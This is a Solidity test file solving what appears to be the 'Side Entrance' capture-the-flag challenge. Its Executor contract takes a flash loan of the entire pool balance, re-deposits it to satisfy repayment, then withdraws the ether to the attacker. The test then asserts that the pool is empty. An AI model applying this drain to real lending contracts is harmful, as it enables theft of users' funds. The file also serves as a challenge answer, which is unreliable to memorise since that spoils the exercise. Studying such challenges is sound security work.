// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";

import "../../side-entrance/SideEntranceLenderPool.sol";

import "openzeppelin-contracts/utils/Address.sol";

contract Executor is IFlashLoanEtherReceiver {
    using Address for address payable;

    SideEntranceLenderPool pool;
    address owner;

    constructor(SideEntranceLenderPool _pool) {
        owner = msg.sender;
        pool = _pool;
    }

    function execute() external payable {
        require(msg.sender == address(pool), "only pool");
        // receive flash loan and call pool.deposit depositing the loaned amount
        pool.deposit{value: msg.value}();
    }

    function borrow() external {
        require(msg.sender == owner, "only owner");
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);

        // we have deposited inside the `execute` method so we withdraw the deposited borrow
        pool.withdraw();

        // now we transfer received pool balance to the owner (attacker)
        payable(owner).sendValue(address(this).balance);
    }

    receive () external payable {}
}

contract SideEntranceLenderPoolTest is BaseTest {

    // Pool has 1000000 ETH in balance
    uint ETHER_IN_POOL = 1000 ether;

    SideEntranceLenderPool pool;

    address payable attacker;
    uint256 attackerInitialEthBalance;

    constructor() {
        string[] memory labels = new string[](2);
        labels[0] = "Attacker";

        preSetup(2, labels);
    }

    function setUp() public override {
        super.setUp();

        attacker = users[0];

        // setup contracts
        pool = new SideEntranceLenderPool();
        vm.label(address(pool), "SideEntranceLenderPool");

        pool.deposit{value: ETHER_IN_POOL}();

        attackerInitialEthBalance = attacker.balance;

        assertEq(address(pool).balance, ETHER_IN_POOL);
    }

    
    function test_Exploit() public {
        runTest();
    }

    function exploit() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(attacker);
        Executor executor = new Executor(pool);
        executor.borrow();
        vm.stopPrank();
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */

        assertEq(address(pool).balance, 0);

        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}
